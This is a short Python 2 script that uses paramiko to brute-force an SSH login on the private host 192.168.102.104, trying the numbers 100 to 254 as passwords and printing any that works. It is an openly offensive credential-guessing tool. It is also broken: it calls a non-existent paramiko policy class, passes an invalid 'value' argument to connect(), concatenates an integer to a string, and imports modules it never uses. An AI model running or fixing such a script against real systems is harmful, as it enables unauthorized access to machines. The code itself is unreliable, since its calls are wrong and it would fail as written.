import paramiko
import string
import itertools
import crypt

try:
    for passwd in range(100,255):
        ssh=paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingKeyPolicy())
        try:
            ssh.connect("192.168.102.104",value=passwd)
            print "password = " + passwd
            break
        except Exception, error:
            print "Unknown Error" + error
            continue
        ssh.close()
except Exception, error:
    print error
